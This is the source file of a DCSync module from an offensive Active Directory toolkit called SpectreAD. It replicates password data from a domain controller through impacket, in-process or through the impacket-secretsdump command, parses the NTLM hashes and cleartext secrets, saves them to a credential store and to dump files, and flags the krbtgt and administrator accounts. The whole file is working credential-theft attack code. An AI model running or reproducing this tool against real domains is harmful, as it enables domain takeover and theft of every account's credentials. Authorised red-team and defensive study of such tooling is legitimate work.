"""
SpectreAD :: core/dcsync.py
DRSUAPI replication. Full domain or a single account.

Author : Inayat Hussain
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess

from core import ui
from core.creds import resolve
from core.store import open_store

SENSITIVE = {"krbtgt", "administrator"}


class _Sink:
    """Collects replication output, persists hashes into the credential store."""

    def __init__(self, store, domain, out_dir, only=None):
        self.store = store
        self.domain = domain
        self.out_dir = out_dir
        self.only = only.lower() if only else None
        self.ntds: list[str] = []
        self.secrets: list[str] = []
        self.hits = 0

    def __call__(self, secret_type, secret):
        text = str(secret)

        if secret_type == "NTLM":
            parts = text.split(":")
            name = parts[0] if parts else ""
            if self.only and name.lower() != self.only:
                return
            self.ntds.append(text)
            if len(parts) >= 4:
                lm, nt = parts[2], parts[3]
                if nt and nt != "aad3b435b51404eeaad3b435b51404ee":
                    self.store.add_cred(self.domain, name, f"{lm}:{nt}", "hash", "dcsync")
                    self.store.add_owned(name, "dcsync")
                    self.hits += 1
                    if name.lower() in SENSITIVE:
                        ui.finding("critical", f"synced {name}", f"{self.domain}\\{name}")
                    elif not name.endswith("$"):
                        ui.ok(f"hash  {name}")

        elif secret_type == "cleartext":
            parts = text.split(":")
            if self.only and parts and parts[0].lower() != self.only:
                return
            self.secrets.append(text)
            if len(parts) >= 3:
                self.store.add_cred(self.domain, parts[0], parts[2], "password", "dcsync")
                ui.ok(f"plain {parts[0]}:{parts[2]}")

    def flush(self):
        os.makedirs(self.out_dir, exist_ok=True)
        if self.ntds:
            p = os.path.join(self.out_dir, "dcsync.ntds")
            with open(p, "w") as fh:
                fh.write("\n".join(self.ntds) + "\n")
            os.chmod(p, 0o600)
            ui.ok(f"ntds -> {p}")
        if self.secrets:
            p = os.path.join(self.out_dir, "dcsync.secrets")
            with open(p, "w") as fh:
                fh.write("\n".join(self.secrets) + "\n")
            os.chmod(p, 0o600)
            ui.ok(f"cleartext -> {p}")


class _NoSession:
    def __init__(self, name):
        self._name = name

    def getMachineName(self):
        return self._name


def run(args) -> None:
    with open_store(args.store) as store:
        cred = resolve(args, store)
        domain, user, pwd, lm, nt = cred.to_impacket()
        dc = args.dc_ip or args.target
        if not dc:
            ui.die("need -dc-ip or -target")

        ui.card("dcsync", [
            ("domain", domain),
            ("dc", dc),
            ("account", args.target_user or "WHOLE DOMAIN"),
            ("hashes only", "yes" if args.just_ntlm else "no"),
        ])
        if args.dry_run:
            ui.info("dry run — nothing replicated")
            return

        sink = _Sink(store, domain, args.out_dir, args.target_user)
        done = _inprocess(domain, dc, cred, sink, args)
        if not done:
            _subprocess(domain, dc, cred, sink, args)
        sink.flush()

        if sink.hits:
            store.add_finding("critical", "Domain replication succeeded",
                              f"{sink.hits} hash(es) via DRSGetNCChanges", host=dc,
                              cred=cred.identity())
        store.log("dcsync", "complete", dc, f"{sink.hits} hashes", cred.identity())
        ui.ok(f"{sink.hits} hash(es) recovered")


def _inprocess(domain, dc, cred, sink, args) -> bool:
    try:
        from impacket.examples.secretsdump import DCSync
    except ImportError:
        return False
    try:
        engine = DCSync(domain, None, dc, _NoSession(dc), perSecretCallback=sink)
        engine.dump(includeSecrets=not args.just_ntlm)
        return sink.hits > 0
    except Exception as exc:
        ui.warn(f"in-process replication failed ({exc}) — falling back")
        return False


def _subprocess(domain, dc, cred, sink, args) -> None:
    if not shutil.which("impacket-secretsdump"):
        ui.die("impacket-secretsdump not on PATH")
    cmd = ["impacket-secretsdump", f"{domain}/{cred.username}@{dc}", "-just-dc"]
    if args.target_user:
        cmd.append(f"-just-dc-user={args.target_user}")
    if args.just_ntlm:
        cmd.append("-just-dc-ntlm")
    if cred.kind == "hash":
        cmd += ["-hashes", cred.secret]
    elif cred.kind == "ticket":
        cmd.append("-k")
    else:
        cmd += ["-p", cred.secret]

    ui.edge(" ".join(cmd))
    proc = subprocess.run(cmd, capture_output=True, text=True)
    for line in proc.stdout.splitlines():
        m = re.match(r"^([^:\\\s]+):(\d+):([0-9a-f]{32}):([0-9a-f]{32}):::", line)
        if m:
            sink("NTLM", f"{m.group(1)}:{m.group(2)}:{m.group(3)}:{m.group(4)}:::")
